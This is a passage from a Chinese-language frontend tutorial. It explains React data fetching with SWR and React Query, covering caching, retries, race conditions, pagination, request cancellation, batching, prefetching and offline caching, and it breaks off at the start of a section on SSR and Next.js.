class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> updateName(&#x27;New Name&#x27;)&#125;&gt;</span><br><span class="language-xml">        更新名字</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>核心特性：</p><ul><li>请求去重：自动避免重复请求</li><li>依赖请求：基于数据依赖的请求链</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: user &#125; = <span class="hljs-title function_">useSWR</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>, fetcher);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: projects &#125; = <span class="hljs-title function_">useSWR</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-string">`/api/projects?userId=<span class="hljs-subst">$&#123;user.id&#125;</span>`</span>, <br>  fetcher<br>);<br></code></pre></td></tr></table></figure><ul><li>SSR 支持：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetcher</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>);<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">fallback</span>: &#123; <span class="hljs-string">&#x27;/api/user/123&#x27;</span>: user &#125; &#125; &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">&#123; fallback &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SWRConfig</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">fallback</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Profile</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SWRConfig</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高级数据管理策略"><a href="#高级数据管理策略" class="headerlink" title="高级数据管理策略"></a>高级数据管理策略</h3><p><strong>请求状态统一管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 封装 useApi 钩子</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useApi</span> = (<span class="hljs-params">key, fn, options = &#123;&#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [status, setStatus] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;idle&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> (params) =&gt; &#123;<br>    <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;pending&#x27;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>(params);<br>      <span class="hljs-title function_">setData</span>(result);<br>      <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;success&#x27;</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-title function_">setError</span>(err);<br>      <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>      <span class="hljs-keyword">throw</span> err;<br>    &#125;<br>  &#125;, [fn]);<br><br>  <span class="hljs-keyword">return</span> &#123;<br>    status,  <span class="hljs-comment">// &#x27;idle&#x27; | &#x27;pending&#x27; | &#x27;success&#x27; | &#x27;error&#x27;</span><br>    data,<br>    error,<br>    execute,<br>    <span class="hljs-attr">isLoading</span>: status === <span class="hljs-string">&#x27;pending&#x27;</span>,<br>    <span class="hljs-attr">isError</span>: status === <span class="hljs-string">&#x27;error&#x27;</span><br>  &#125;;<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> &#123; data, status, <span class="hljs-attr">execute</span>: fetchUser &#125; = <span class="hljs-title function_">useApi</span>(<br>  <span class="hljs-string">&#x27;userData&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">userId</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>)<br>);<br></code></pre></td></tr></table></figure><p><strong>数据缓存策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 React Query 的缓存工具</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">cacheTime</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// 15分钟缓存</span><br>      <span class="hljs-attr">staleTime</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,  <span class="hljs-comment">// 5分钟保鲜</span><br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 手动管理缓存</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">updateCache</span> = (<span class="hljs-params">newUser</span>) =&gt; &#123;<br>  queryClient.<span class="hljs-title function_">setQueryData</span>([<span class="hljs-string">&#x27;user&#x27;</span>, newUser.<span class="hljs-property">id</span>], newUser);<br>  <br>  <span class="hljs-comment">// 更新列表缓存</span><br>  queryClient.<span class="hljs-title function_">setQueryData</span>([<span class="hljs-string">&#x27;users&#x27;</span>], <span class="hljs-function">(<span class="hljs-params">old</span>) =&gt;</span> <br>    old.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">id</span> === newUser.<span class="hljs-property">id</span> ? newUser : user)<br>  );<br>&#125;;<br><br><span class="hljs-comment">// SWR 全局配置</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SWRConfig</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">provider:</span> () =&gt;</span> new Map(),</span><br><span class="language-xml">    isOnline() &#123;</span><br><span class="language-xml">      // 自定义网络状态检测</span><br><span class="language-xml">      return navigator.onLine;</span><br><span class="language-xml">    &#125;</span><br><span class="language-xml">  &#125;&#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">SWRConfig</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="面试高频问题解决方案-1"><a href="#面试高频问题解决方案-1" class="headerlink" title="面试高频问题解决方案"></a>面试高频问题解决方案</h3><p><strong>请求竞态问题（Race Condition）</strong></p><p>问题：快速切换参数导致旧请求覆盖新响应</p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>);<br>    <br>    api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setData</span>(res.<span class="hljs-property">data</span>);<br>      &#125;)<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setError</span>(err);<br>      &#125;);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span>; &#125;;<br>  &#125;, [userId]);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>请求重试策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Query 指数退避重试</span><br><span class="hljs-title function_">useQuery</span>(<span class="hljs-string">&#x27;todos&#x27;</span>, fetchTodos, &#123;<br>  <span class="hljs-attr">retry</span>: <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">retryDelay</span>: <span class="hljs-function">(<span class="hljs-params">attemptIndex</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">1000</span> * <span class="hljs-number">2</span> ** attemptIndex, <span class="hljs-number">30000</span>)<br>&#125;);<br><br><span class="hljs-comment">// Axios 拦截器重试</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-literal">null</span>, <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> config = error.<span class="hljs-property">config</span>;<br>  <span class="hljs-keyword">if</span> (!config || !config.<span class="hljs-property">retry</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  <br>  config.<span class="hljs-property">retryCount</span> = config.<span class="hljs-property">retryCount</span> || <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">retryCount</span> &gt;= config.<span class="hljs-property">retry</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>  <br>  config.<span class="hljs-property">retryCount</span> += <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">api</span>(config)), config.<span class="hljs-property">retryDelay</span> || <span class="hljs-number">1000</span>)<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>大数据量分页优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Query 无限加载</span><br><span class="hljs-keyword">const</span> &#123; data, fetchNextPage, hasNextPage &#125; = <span class="hljs-title function_">useInfiniteQuery</span>(<br>  <span class="hljs-string">&#x27;projects&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">&#123; pageParam = <span class="hljs-number">0</span> &#125;</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/projects?offset=<span class="hljs-subst">$&#123;pageParam&#125;</span>&amp;limit=20`</span>),<br>  &#123;<br>    <span class="hljs-attr">getNextPageParam</span>: <span class="hljs-function">(<span class="hljs-params">lastPage</span>) =&gt;</span> <br>      lastPage.<span class="hljs-property">hasMore</span> ? lastPage.<span class="hljs-property">nextOffset</span> : <span class="hljs-literal">undefined</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// 虚拟列表渲染</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FixedSizeList</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-window&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProjectList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FixedSizeList</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemCount</span>=<span class="hljs-string">&#123;data?.pages.flat().length</span> || <span class="hljs-attr">0</span>&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemSize</span>=<span class="hljs-string">&#123;100&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      &#123;(&#123; index, style &#125;) =&gt; &#123;</span><br><span class="language-xml">        const item = data.pages.flat()[index];</span><br><span class="language-xml">        return (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProjectItem</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;item&#125;</span> /&gt;</span></span><br><span class="language-xml">            &#123;index === data.pages.flat().length - 1 &amp;&amp; hasNextPage &amp;&amp; (</span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;fetchNextPage&#125;</span>&gt;</span>加载更多<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            )&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        );</span><br><span class="language-xml">      &#125;&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FixedSizeList</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>请求取消与垃圾回收</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// AbortController 取消请求</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, &#123;<br>        <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span><br>      &#125;);<br>      <span class="hljs-comment">// 处理响应</span><br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> === <span class="hljs-string">&#x27;AbortError&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Request aborted&#x27;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 处理其他错误</span><br>      &#125;<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">fetchData</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>();<br>&#125;, [url]);<br><br><span class="hljs-comment">// React Query 自动垃圾回收</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">gcTime</span>: <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// 10分钟后清理缓存</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="性能优化实践"><a href="#性能优化实践" class="headerlink" title="性能优化实践"></a>性能优化实践</h3><p><strong>请求合并与批处理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// GraphQL 请求合并</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_USERS</span> = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">query</span> GetUsers<span class="hljs-punctuation">(</span><span class="hljs-variable">$ids</span>: <span class="hljs-punctuation">[</span>ID<span class="hljs-punctuation">!</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">!</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    users<span class="hljs-punctuation">(</span><span class="hljs-symbol">ids</span><span class="hljs-punctuation">:</span> <span class="hljs-variable">$ids</span>) <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">      id</span><br><span class="language-graphql">      name</span><br><span class="language-graphql">      email</span><br><span class="language-graphql">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-comment">// REST API 批处理中间件</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/api/batch&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> requests = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(requests.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url, method, body &#125;</span>) =&gt;</span> <br>    <span class="hljs-title function_">handleRequest</span>(url, method, body)<br>  )).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">results</span> =&gt;</span> res.<span class="hljs-title function_">json</span>(results));<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>数据预取策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router v6.4+ 数据预取</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/user/:id&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>      <span class="hljs-keyword">return</span> queryClient.<span class="hljs-title function_">fetchQuery</span>(<br>        [<span class="hljs-string">&#x27;user&#x27;</span>, params.<span class="hljs-property">id</span>],<br>        <span class="hljs-function">() =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>)<br>      );<br>    &#125;<br>  &#125;<br>]);<br><br><span class="hljs-comment">// 用户悬停预取</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/user/123&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> queryClient.prefetchQuery(</span><br><span class="language-xml">    [&#x27;user&#x27;, 123],</span><br><span class="language-xml">    () =&gt; api.get(&#x27;/users/123&#x27;)</span><br><span class="language-xml">  )&#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  用户资料</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>离线数据策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 IndexedDB 缓存数据</span><br><span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-title function_">useSWR</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>, fetcher, &#123;<br>  <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 保存到 IndexedDB</span><br>    idb.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;cachedData&#x27;</span>, data);<br>  &#125;,<br>  <span class="hljs-attr">fallbackData</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 从 IndexedDB 获取缓存</span><br>    <span class="hljs-keyword">return</span> idb.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;cachedData&#x27;</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// React Query 离线恢复</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">networkMode</span>: <span class="hljs-string">&#x27;offlineFirst&#x27;</span>,<br>      <span class="hljs-attr">cacheTime</span>: <span class="hljs-title class_">Infinity</span> <span class="hljs-comment">// 持久化缓存</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><ul><li>基础方案选择：<ul><li>简单场景：优先使用 fetch</li><li>企业应用：推荐 axios 作为 HTTP 客户端</li></ul></li><li>现代数据管理：<ul><li>复杂应用：选择 React Query（功能全面）</li><li>轻量项目：选择 SWR（快速集成）</li></ul></li><li>关键能力：<ul><li>智能缓存管理</li><li>自动请求重试</li><li>乐观更新实现</li><li>分页&#x2F;无限加载</li></ul></li><li>性能优化：<ul><li>请求批处理</li><li>数据预取</li><li>离线缓存策略</li><li>虚拟列表渲染</li></ul></li><li>面试重点：<ul><li>请求竞态解决方案</li><li>缓存策略设计</li><li>错误处理与重试机制</li><li>大型数据分页优化</li></ul></li></ul><h2 id="6-5-SSR-与-Next-js-基础"><a href="#6-5-SSR-与-Next-js-基础" class="headerlink" title="6.5 SSR 与 Next.js 基础"></a>6.5 SSR 与 Next.js 基础</h2><h3 id="SSR-核心概念"><a href="#SSR-核心概念" class="headerlink" title="SSR 核心概念"></a>SSR 核心概念</h3><p><strong>渲染模式对比</strong></p><table><thead><tr><th align="left">渲染方式</th><th align="left">特点</th><th align="left">SEO</th><th align="left">首屏时间</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">客户端渲染 (CSR)</td><td align="left">浏览器下载 JS 后渲染</td><td 